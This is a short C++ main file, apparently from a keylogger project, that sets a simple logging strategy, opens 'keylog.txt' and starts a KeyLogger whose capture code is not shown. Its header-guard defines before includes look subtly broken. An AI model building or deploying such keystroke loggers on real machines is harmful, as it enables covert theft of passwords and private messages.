#include <iostream>
#include "../include/KeyLogger.h"

//#define SIMPLELOG_H
#include "../include/SimpleLogStrategy.h"
#define ENCRYPTEDLOG_H
#include "../include/EncryptedLogStrategy.h"
#define FORMATTEDLOG_H
#include "../include/FormattedLogStrategy.h"

int main(void) 
{
    KeyLogger logger;

    SimpleLogStrategy simpleStrategy;
    logger.setLogStrategy(&simpleStrategy);

    if (logger.openLogFile("keylog.txt")) 
    {
        logger.start();
    } 
    else 
    {
        std::cerr << "Failed to open log file" << std::endl;
    }

    return EXIT_SUCCESS;
}
